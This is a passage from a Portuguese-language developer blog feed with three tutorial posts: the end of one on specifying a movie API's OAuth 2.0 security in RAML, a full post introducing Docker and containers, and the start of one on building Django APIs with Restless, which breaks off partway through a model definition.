      &lt;span class="nt"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;dataValidation&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Traits&lt;/em&gt; são extremamente úteis para descrever comportamentos que são comuns entre recursos (por exemplo, listagens
que possuem paginação). Outro conceito similar é o &lt;em&gt;Resource Types&lt;/em&gt;, no qual você pode ler mais sobre na &lt;a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/#declaration-resource-types-and-traits" title="Resource Types and Traits"&gt;documentação oficial&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Descrevendo a segurança&lt;/h2&gt;
&lt;p&gt;Para finalizar nosso exemplo. Vamos supor que o acesso à &lt;em&gt;API&lt;/em&gt; é limitado, e o usuário precisa ter uma
conta para acessá-la. Para não reinventar a roda, vamos supor que optamos pelo padrão &lt;a href="https://aaronparecki.com/oauth-2-simplified/" title="OAuth 2 simplified"&gt;&lt;em&gt;OAuth 2&lt;/em&gt;&lt;/a&gt;
para autenticação e autorização.&lt;/p&gt;
&lt;p&gt;Abaixo da propriedade &lt;code&gt;mediaType&lt;/code&gt; vamos criar um novo bloco chamado &lt;code&gt;securitySchemes&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;securitySchemes&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;oauth_2_0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;We support OAuth 2.0 for authenticating all API requests.&lt;/span&gt;
    &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;OAuth 2.0&lt;/span&gt;
    &lt;span class="nt"&gt;describedBy&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;Authorization&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
             &lt;span class="no"&gt;Used to send a valid OAuth 2 access token. Do not use&lt;/span&gt;
             &lt;span class="no"&gt;with the &amp;quot;access_token&amp;quot; query string parameter.&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
      &lt;span class="nt"&gt;queryParameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;access_token&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
             &lt;span class="no"&gt;Used to send a valid OAuth 2 access token.&lt;/span&gt;
             &lt;span class="no"&gt;Do not use with the &amp;quot;Authorization&amp;quot; header.&lt;/span&gt;
          &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;401&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
              &lt;span class="no"&gt;Bad or expired token. This can happen if the&lt;/span&gt;
              &lt;span class="no"&gt;user or Movie API revoked or expired an access&lt;/span&gt;
              &lt;span class="no"&gt;token. To fix, re-authenticate the user.&lt;/span&gt;
        &lt;span class="nt"&gt;403&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
              &lt;span class="no"&gt;Bad OAuth request (wrong consumer key, bad nonce,&lt;/span&gt;
              &lt;span class="no"&gt;expired timestamp...). Unfortunately,&lt;/span&gt;
              &lt;span class="no"&gt;re-authenticating the user won&amp;#39;t help here.&lt;/span&gt;
    &lt;span class="nt"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;authorizationUri&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://www.movies.com/1/oauth2/authorize&lt;/span&gt;
      &lt;span class="nt"&gt;accessTokenUri&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://api.movies.com/1/oauth2/token&lt;/span&gt;
      &lt;span class="nt"&gt;authorizationGrants&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;authorization_code&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;implicit&lt;/span&gt; &lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Serei sincero com você, caro leitor, o código acima é uma receita de bolo para descrever
o &lt;code&gt;securitySchemes&lt;/code&gt; do tipo &lt;em&gt;OAuth 2&lt;/em&gt;. Nada de muito diferente do que a gente viu até aqui,
com exceção do uso do &lt;code&gt;|&lt;/code&gt;, que nesse caso serve para fazer textos em bloco, e da
propriedade &lt;code&gt;type&lt;/code&gt; com valor &lt;code&gt;OAuth 2.0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;No nosso cenário, apenas temos intenção de proteger a escrita de dados na &lt;em&gt;API&lt;/em&gt;. Para tanto,
Vamos adicionar a propriedade &lt;code&gt;securedBy&lt;/code&gt; aos blocos &lt;code&gt;post&lt;/code&gt; e &lt;code&gt;put&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;post&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;dataValidation&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
    &lt;span class="nt"&gt;securedBy&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;oauth_2_0&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;put&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;dataValidation&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
      &lt;span class="nt"&gt;securedBy&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;oauth_2_0&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! A especificação da nossa &lt;em&gt;API&lt;/em&gt; está completa! Temos uma documentação forte, que pode ser lida
por humanos e máquinas. Para fins didáticos não utilizei recursos
interessantes como a propriedade &lt;code&gt;example&lt;/code&gt; ou a ferramenta &lt;code&gt;!include&lt;/code&gt;. Mas você pode ler sobre
eles na &lt;a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md"&gt;especificação do &lt;em&gt;RAML&lt;/em&gt; 1.0&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/kplaube/post-raml/blob/8e580fa4d328a3f5f9e89e23d8b283ec04cf9637/api.raml"&gt;Veja como ficou a versão final do nosso arquivo api.raml&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Através de uma linguagem clara fomos capazes de construir uma especificação legível para a nossa &lt;em&gt;API&lt;/em&gt;.
Com isso, outros desenvolvedores (ou até mesmo máquinas) serão capazes de entender como funciona cada &lt;em&gt;endpoint&lt;/em&gt;.
Com a adição de ferramentas como o &lt;a href="https://github.com/cybertk/abao" title="REST API automated testing tool"&gt;&lt;em&gt;Abao&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://github.com/raml2html/raml2html" title="RAML to HTML documentation generator"&gt;&lt;em&gt;raml2html&lt;/em&gt;&lt;/a&gt;, os resultados
do uso do &lt;em&gt;RAML&lt;/em&gt; podem ser surpreendentes, como no exemplo abaixo:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/example-raml.png" width="640" height="383" title="Exemplo de documentação gerada pelo raml2html" alt="Exemplo de documentação gerada pelo raml2html"&gt;&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h1&gt;Referências&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md"&gt;Github: RAML Version 1.0 specification&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sitepoint.com/raml-restful-api-modeling-language/"&gt;Sitepoint: RAML, the RESTful API modeling language&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="microservices"></category><category term="apis"></category><category term="raml"></category></entry><entry><title>Uma ode ao Docker - Parte 1</title><link href="https://klauslaube.com.br/2017/01/14/uma-ode-ao-docker-parte-1.html" rel="alternate"></link><published>2017-01-14T18:20:00-02:00</published><updated>2017-01-14T18:20:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-01-14:/2017/01/14/uma-ode-ao-docker-parte-1.html</id><summary type="html">&lt;p&gt;Virtualização é um dos assuntos que mais evoluiu nesses últimos anos de TI. Mas
foi o termo "containerização" que teve um "boom" de popularidade recentemente. Isso graças
ao &lt;a href="https://www.docker.com/" title="Build, ship, run"&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;, popular ferramenta que tem
tornado a virtualização/containerização em uma &lt;em&gt;commodity&lt;/em&gt; no universo de desenvolvimento de &lt;em&gt;Software&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Para ser sincero, eu …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Virtualização é um dos assuntos que mais evoluiu nesses últimos anos de TI. Mas
foi o termo "containerização" que teve um "boom" de popularidade recentemente. Isso graças
ao &lt;a href="https://www.docker.com/" title="Build, ship, run"&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;, popular ferramenta que tem
tornado a virtualização/containerização em uma &lt;em&gt;commodity&lt;/em&gt; no universo de desenvolvimento de &lt;em&gt;Software&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Para ser sincero, eu só "parei para olhar" o &lt;em&gt;Docker&lt;/em&gt; no final do ano passado,
através de um
&lt;a href="https://www.udemy.com/docker-tutorial-for-devops-run-docker-containers/learn/v4/overview" title="The Complete Docker Course for DevOps and Developers"&gt;excelente curso do &lt;em&gt;Udemy&lt;/em&gt;&lt;/a&gt;.
Se você assim como eu ainda não teve tempo para ver "qualé", vem comigo que eu te mostro :)&lt;/p&gt;
&lt;h2&gt;Antes do Docker: Containers&lt;/h2&gt;
&lt;p&gt;Eu só comecei a entender realmente o que era o &lt;em&gt;Docker&lt;/em&gt; a partir do momento
que compreendi o que é um container.&lt;/p&gt;
&lt;p&gt;No mundo "pré-virtualização", quando lidávamos com problemas como escalabilidade ou isolamento,
precisávamos adquirir uma nova máquina física, instalar e configurar o Sistema Operacional,
bem como instalar e configurar a própria aplicação:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/docker-pre-virtualization.png" width="400" height="292" title="Diagrama de era pré-virtualização (udemy.com)" alt="Diagrama de era pré-virtualização (udemy.com)"&gt;&lt;/p&gt;
&lt;p&gt;Além do custo altíssimo para replicar a arquitetura acima, o tempo para solicitar uma
nova máquina e realizar uma possível migração eram absurdamente altos. Além disso,
há um incrível desperdício de recursos, já que não é necessário um &lt;em&gt;hardware&lt;/em&gt;
exclusivo para servir uma aplicação &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; simples.&lt;/p&gt;
&lt;h3&gt;Hypervisor&lt;/h3&gt;
&lt;p&gt;O conceito de &lt;a href="https://klauslaube.com.br/tag/virtualizacao.html" title="Leia mais sobre virtualização"&gt;máquina virtual&lt;/a&gt; vem bem a calhar para sanar o problema acima: Através de uma
configuração de &lt;em&gt;hardware&lt;/em&gt;, ser possível servir de forma isolada diferentes aplicações.&lt;/p&gt;
&lt;p&gt;Quando falamos de máquinas virtuais &lt;a href="https://klauslaube.com.br/tag/virtualbox.html" title="Leia mais sobre Virtualbox"&gt;&lt;em&gt;Virtualbox&lt;/em&gt;&lt;/a&gt; ou &lt;em&gt;VMWare&lt;/em&gt;,
estamos nos referindo ao &lt;em&gt;Hypervisor-based Virtualization&lt;/em&gt;. Nessa modalidade temos uma ferramenta responsável
por abstrair diferentes Sistemas Operacionais funcionando dentro de um mesmo &lt;em&gt;hardware&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/docker-hypervisor-virtualization.png" width="400" height="499" title="Diagrama de virtualização por hypervisor (udemy.com)" alt="Diagrama de virtualização por hypervisor (udemy.com)"&gt;&lt;/p&gt;
&lt;p&gt;Para cada máquina virtual, é necessário um Sistema Operacional instalado e configurado, bem como
a própria aplicação.&lt;/p&gt;
&lt;p&gt;Agora somos capazes de reaproveitar o processador, memória e banda de rede, reduzindo consideravelmente o custo.
Essa "abstração" que há entre a aplicação e o &lt;em&gt;hardware&lt;/em&gt; permite maior flexibilidade quando houver a necessidade
de escalar ou migrar a aplicação para outra máquina física.&lt;/p&gt;
&lt;p&gt;Bom! Mas e se pudéssemos compartilhar o mesmo Sistema Operacional para as 3 &lt;em&gt;apps&lt;/em&gt; ilustradas acima, mas ainda assim
mantê-las isoladas?&lt;/p&gt;
&lt;h3&gt;Containers&lt;/h3&gt;
&lt;p&gt;Segundo o &lt;em&gt;ZDNet&lt;/em&gt;, &lt;em&gt;containers&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) use shared operating systems. That means they are much more efficient than hypervisors
in system resource terms. Instead of virtualizing hardware, containers rest on top of a single
Linux instance. This in turn means you can leave behind the useless 99.9% VM junk, leaving you
with a small, neat capsule containing your application.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Através de &lt;em&gt;Containers&lt;/em&gt; é possível utilizar o conceito de virtualização, só que de uma
maneira diferente: Não temos mais um Sistema Operacional por ambiente virtualizado,
e sim compartilhamos os mesmos recursos do Sistema Operacional da máquina hospedeira:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/docker-containers.png" width="400" height="239" title="Diagrama de containerização (udemy.com)" alt="Diagrama de containerização (udemy.com)"&gt;&lt;/p&gt;
&lt;p&gt;Com isso reduzimos ainda mais os custos de operação, além de proporcionar um tempo ainda menor
de &lt;em&gt;deployment&lt;/em&gt; de uma nova aplicação. Agora, do ponto de vista da aplicação, precisamos apenas
do &lt;em&gt;app&lt;/em&gt; instalado e configurado.&lt;/p&gt;
&lt;h2&gt;Enfim: O que é Docker?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Docker&lt;/em&gt; é uma ferramenta &lt;em&gt;open source&lt;/em&gt;, responsável por tornar fácil a criação, &lt;em&gt;deploy&lt;/em&gt; e execução
de aplicações através do uso de &lt;em&gt;containers&lt;/em&gt;. Com a containerização &lt;em&gt;Docker&lt;/em&gt;, o desenvolver pode
empacotar a aplicação com todas as suas dependências, e distribuí-la através de um pacote único. Esse
pacote único executará em qualquer máquina &lt;em&gt;Linux&lt;/em&gt; (com &lt;em&gt;Docker&lt;/em&gt;, claro), podendo ser o seu ambiente
de desenvolvimento local, seu &lt;a href="https://klauslaube.com.br/2011/03/07/diferentes-ambientes.html" title="Development, staging e production"&gt;ambiente de testes e homologação&lt;/a&gt;,
ou até mesmo o ambiente de produção.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/iron-man-containers.png" width="640" height="342" title="Vim falar de Docker mas só encontrei containers (marvelcinematicuniverse.wikia.com)" alt="Vim falar de Docker mas só encontrei containers (marvelcinematicuniverse.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Se até aqui você achou o &lt;em&gt;Docker&lt;/em&gt; semelhante ao &lt;a href="https://klauslaube.com.br/2015/10/03/esse-e-mais-um-post-sobre-vagrant.html" title="Esse é mais um post sobre Vagrant"&gt;&lt;em&gt;Vagrant&lt;/em&gt;&lt;/a&gt;,
você não está de todo errado. A principal diferença é justamente o conceito de &lt;em&gt;containers&lt;/em&gt;: &lt;em&gt;Docker&lt;/em&gt; permite
que aplicações utilizem o mesmo &lt;em&gt;kernel&lt;/em&gt; &lt;em&gt;Linux&lt;/em&gt; da máquina hospedeira, reduzindo drasticamente o
tamanho da aplicação e reduzindo o consumo de recursos da máquina hospedeira.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Docker&lt;/em&gt; é no fim das contas uma ferramenta extremamente útil, e que possui umas das comunidades mais
ativas e empenhadas no momento. Ferramentas de &lt;em&gt;PaaS&lt;/em&gt; como o &lt;a href="https://tsuru.io/" title="Extensible and open source Platform as a Service"&gt;&lt;em&gt;Tsuru&lt;/em&gt;&lt;/a&gt;
utilizam &lt;em&gt;Docker&lt;/em&gt; ativamente e servem inúmeros serviços e aplicações nesse exato momento.&lt;/p&gt;
&lt;p&gt;Se até aqui você não está bem certo sobre o que é de fato o &lt;em&gt;Docker&lt;/em&gt;, não se preocupe! Na parte 2 falaremos mais
sobre a ferramenta (e menos sobre o conceito) de uma forma bem prática.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.com/resources/what-docker"&gt;&lt;em&gt;Opensource.com - What is Docker?&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://searchservervirtualization.techtarget.com/definition/hypervisor"&gt;&lt;em&gt;TechTarget - Hypervisor definition&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zdnet.com/article/what-is-docker-and-why-is-it-so-darn-popular/"&gt;&lt;em&gt;ZDNet - What is Docker and why is it so darn popular?&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="infraestrutura"></category><category term="virtualizacao"></category><category term="containerizacao"></category><category term="docker"></category></entry><entry><title>Construindo APIs em Django com Restless</title><link href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" rel="alternate"></link><published>2017-01-06T10:45:00-02:00</published><updated>2017-01-06T10:45:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-01-06:/2017/01/06/construindo-apis-em-django-com-restless.html</id><summary type="html">&lt;p&gt;Construir &lt;em&gt;APIs&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; em
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; nos dias atuais é uma
tarefa no máximo corriqueira. Com a ajuda de bibliotecas consagradas, como
&lt;a href="http://www.django-rest-framework.org/"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://django-tastypie.readthedocs.io/en/latest/"&gt;&lt;em&gt;Tastypie&lt;/em&gt;&lt;/a&gt;,
e utilizando toda a abstração que envolve os &lt;em&gt;Models&lt;/em&gt; do &lt;em&gt;framework&lt;/em&gt;, é
possível ter &lt;em&gt;endpoints&lt;/em&gt; respondendo em questão de minutos.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas existem alternativas que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Construir &lt;em&gt;APIs&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; em
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; nos dias atuais é uma
tarefa no máximo corriqueira. Com a ajuda de bibliotecas consagradas, como
&lt;a href="http://www.django-rest-framework.org/"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://django-tastypie.readthedocs.io/en/latest/"&gt;&lt;em&gt;Tastypie&lt;/em&gt;&lt;/a&gt;,
e utilizando toda a abstração que envolve os &lt;em&gt;Models&lt;/em&gt; do &lt;em&gt;framework&lt;/em&gt;, é
possível ter &lt;em&gt;endpoints&lt;/em&gt; respondendo em questão de minutos.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas existem alternativas que são capazes de tornar esse processo ainda
mais prático, e com uma curva de aprendizado um pouquinho menor. Nesse
seleto grupo, uma biblioteca que me agrada é o &lt;a href="https://github.com/toastdriven/restless"&gt;&lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Por que Restless (e não as outras)?&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/toastdriven"&gt;&lt;em&gt;Daniel Lindsley&lt;/em&gt;&lt;/a&gt; (também conhecido como &lt;em&gt;Toast Driven&lt;/em&gt;),
um dos criadores do &lt;em&gt;Tastypie&lt;/em&gt; (famosa biblioteca &lt;em&gt;Django&lt;/em&gt; para construção de &lt;em&gt;APIs RESTful&lt;/em&gt;),
também é criador do &lt;em&gt;Restless&lt;/em&gt;. Segundo ele, o que o motivou a escrever uma alternativa ao &lt;em&gt;Tastypie&lt;/em&gt; foi:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Quite simply, I care about creating flexible &amp;amp; RESTFul APIs. In building Tastypie, I tried
to create something extremely complete &amp;amp; comprehensive. The result was writing a lot of hook
methods (for easy extensibility) &amp;amp; a lot of (perceived) bloat, as I tried to accommodate for
everything people might want/need in a flexible/overridable manner.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Não há dúvidas que as duas bibliotecas citadas no início desse artigo são extremamente completas.
Se você estiver procurando um &lt;em&gt;engine&lt;/em&gt; poderoso para a criação de &lt;em&gt;APIs&lt;/em&gt; em &lt;em&gt;Django&lt;/em&gt;, pule logo
para a &lt;a href="http://www.django-rest-framework.org/tutorial/quickstart/" title="Comece agora com o REST Framework"&gt;documentação do &lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Mas nem sempre precisamos de todo esse poderio para dar vida ao nosso projeto. E é exatamente
com esse posicionamento que &lt;em&gt;Daniel&lt;/em&gt; fecha o seu argumento:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;But in reality, all I really ever personally want are the RESTful verbs, JSON serialization &amp;amp;
the ability of override behavior.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se assim como o autor você só precisa dos verbos &lt;em&gt;HTTP&lt;/em&gt;, serialização &lt;em&gt;JSON&lt;/em&gt; e uma leve camada
de customização, talvez o &lt;em&gt;Restless&lt;/em&gt; seja tudo o que você necessita.&lt;/p&gt;
&lt;p&gt;Por último mas não menos importante: O &lt;em&gt;Restless&lt;/em&gt;, é "framework agnostic" e funciona com &lt;em&gt;Django&lt;/em&gt;,
&lt;em&gt;Flask&lt;/em&gt;, &lt;em&gt;Pyramid&lt;/em&gt; e &lt;em&gt;Tornado&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Mão na massa&lt;/h2&gt;
&lt;p&gt;Lembra do nosso "mini IMDB", lá do &lt;a href="https://klauslaube.com.br/2016/05/20/rest-parte-2.html" title="Leia mais sobre REST"&gt;&lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;REST&lt;/em&gt;&lt;/a&gt;? Vamos aproveitar a temática para exemplificar
o uso de &lt;em&gt;Restless&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;. Mas antes, aquele &lt;code&gt;pip&lt;/code&gt; "de leve" para instalar o pacote:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install restless
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não é necessária a adição da biblioteca ao &lt;code&gt;settings.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Relembrando o exemplo do &lt;em&gt;post&lt;/em&gt; anterior, precisaremos construir os seguintes recursos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET /movies&lt;/code&gt;: Trará uma lista de filmes&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POST /movies&lt;/code&gt;: Adicionará um novo filme ao banco de dados&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET /movies/{id}&lt;/code&gt;: Trará um filme específico&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUT /movies/{id}&lt;/code&gt;: Atualizará um filme específico&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELETE /movies/{id}&lt;/code&gt;: Removerá um filme específico do banco de dados&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para tanto, teremos um &lt;em&gt;model&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; similar ao abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/models.py&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;uuid&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UUIDField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;editable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
